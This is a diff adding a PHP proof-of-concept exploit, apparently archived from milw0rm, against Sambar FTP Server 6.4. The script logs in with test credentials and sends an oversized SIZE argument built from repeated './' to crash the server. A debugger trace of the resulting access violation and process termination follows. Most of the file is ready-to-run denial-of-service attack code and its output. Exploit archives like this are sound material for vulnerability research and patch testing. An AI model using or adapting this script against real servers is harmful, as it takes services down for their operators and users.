@@ -1,0 +1,105 @@
+<?php
+
+# Sambar FTP Server 6.4 SIZE Denial Of Service
+# by rgod
+# mail: retrog at alice dot it
+# site: http://retrogod.altervista.org
+
+# tested on WinXP sp2
+
+error_reporting(E_ALL);
+
+$service_port = getservbyname('ftp', 'tcp');
+$address = gethostbyname('192.168.1.3');
+
+$user="test";
+$pass="test";
+
+$junk="";
+for ($i=1; $i<=160; $i++){
+    $junk.="./";
+}
+
+$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+if ($socket < 0) {
+   echo "socket_create() failed:\n reason: " . socket_strerror($socket) . "\n";
+} else {
+   echo "OK.\n";
+}
+
+$result = socket_connect($socket, $address, $service_port);
+if ($result < 0) {
+   echo "socket_connect() failed:\n reason: ($result) " . socket_strerror($result) . "\n";
+} else {
+   echo "OK.\n";
+}
+
+$out=socket_read($socket, 240);
+echo $out;
+
+$in = "USER ".$user."\r\n";
+socket_write($socket, $in, strlen ($in));
+
+$out=socket_read($socket, 80);
+echo $out;
+
+$in = "PASS ".$pass."\r\n";
+socket_write($socket, $in, strlen ($in));
+
+$out=socket_read($socket, 80);
+echo $out;
+
+$in = "SIZE ".$junk."\r\n";
+socket_write($socket, $in, strlen ($in));
+
+socket_close($socket);
+
+/*20:13:17.600  pid=0C50 tid=0148  EXCEPTION (first-chance)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [2E2F2E7B])
+              ----------------------------------------------------------------
+              EAX=2E2F2E2F: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              ECX=00000170: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDX=012CE7F0: 35 35 30 20 43 61 6E 27-74 20 61 63 63 65 73 73
+              ESP=012CE7C0: F0 E7 2C 01 FD FF FF FF-01 00 00 00 00 00 00 00
+              EBP=012CE900: 2F 2E 2F 2E 2F 2E 2F 2E-2F 2E 2F 2E 2F 2E 2F 2E
+              ESI=00A0E3C0: 00 00 00 00 28 60 E2 00-B0 C0 D3 00 78 A6 28 10
+              EDI=00A016A0: 01 00 00 00 01 00 00 00-0A 00 00 00 B6 0B 00 00
+              EIP=1008DB22: 8B 48 4C 51 8B 55 08 8B-42 58 50 E8 EE AD 18 00
+                            --> MOV ECX,[EAX+4C]
+              ----------------------------------------------------------------
+
+20:13:17.610  pid=0C50 tid=0148  EXCEPTION (unhandled)
+              ----------------------------------------------------------------
+              Exception C0000005 (ACCESS_VIOLATION reading [2E2F2E7B])
+              ----------------------------------------------------------------
+              EAX=2E2F2E2F: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              ECX=00000170: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
+              EDX=012CE7F0: 35 35 30 20 43 61 6E 27-74 20 61 63 63 65 73 73
+              ESP=012CE7C0: F0 E7 2C 01 FD FF FF FF-01 00 00 00 00 00 00 00
+              EBP=012CE900: 2F 2E 2F 2E 2F 2E 2F 2E-2F 2E 2F 2E 2F 2E 2F 2E
+              ESI=00A0E3C0: 00 00 00 00 28 60 E2 00-B0 C0 D3 00 78 A6 28 10
+              EDI=00A016A0: 01 00 00 00 01 00 00 00-0A 00 00 00 B6 0B 00 00
+              EIP=1008DB22: 8B 48 4C 51 8B 55 08 8B-42 58 50 E8 EE AD 18 00
+                            --> MOV ECX,[EAX+4C]
+              ----------------------------------------------------------------
+
+20:13:17.610  pid=0C50 tid=0148  Thread exited with code 3221225477
+20:13:17.610  pid=0C50 tid=0D40  Thread exited with code 3221225477
+20:13:17.610  pid=0C50 tid=08A0  Thread exited with code 3221225477
+20:13:17.610  pid=0C50 tid=0900  Thread exited with code 3221225477
+20:13:17.610  pid=0C50 tid=0C44  Thread exited with code 3221225477
+20:13:17.610  pid=0C50 tid=0750  Thread exited with code 3221225477
+20:13:17.610  pid=0C50 tid=0244  Thread exited with code 3221225477
+20:13:17.610  pid=0C50 tid=04F0  Thread exited with code 3221225477
+20:13:17.610  pid=0C50 tid=0AC4  Thread exited with code 3221225477
+20:13:17.610  pid=0C50 tid=0870  Thread exited with code 3221225477
+20:13:17.610  pid=0C50 tid=01F0  Thread exited with code 3221225477
+20:13:17.610  pid=0C50 tid=0114  Thread exited with code 3221225477
+20:13:17.610  pid=0C50 tid=0ABC  Process exited with code 3221225477
+*/
+?>
+
+# milw0rm.com [2006-12-15]
